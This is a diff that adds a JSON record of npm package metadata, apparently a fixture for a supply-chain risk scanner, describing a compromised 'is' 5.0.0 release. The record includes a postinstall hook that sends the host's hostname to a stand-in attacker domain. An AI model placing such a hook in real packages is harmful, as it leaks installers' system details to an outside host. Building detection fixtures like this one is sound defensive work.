@@ -1,0 +1,17 @@
+{
+  "name": "is",
+  "version": "5.0.0",
+  "ecosystem": "npm",
+  "maintainers": ["compromised-dormant-maintainer"],
+  "prior_maintainers": ["compromised-dormant-maintainer"],
+  "publish_time": 1721347200,
+  "dependencies": ["axios", "form-data"],
+  "prior_dependencies": [],
+  "install_hooks": [
+    {"stage": "postinstall", "command": "node -e \"require('https').get('https://harvester.attacker.example/?h=' + require('os').hostname())\""}
+  ],
+  "advisories": [],
+  "typosquat_matches": [],
+  "age_hours": 0.5,
+  "popularity_rank": 200
+}
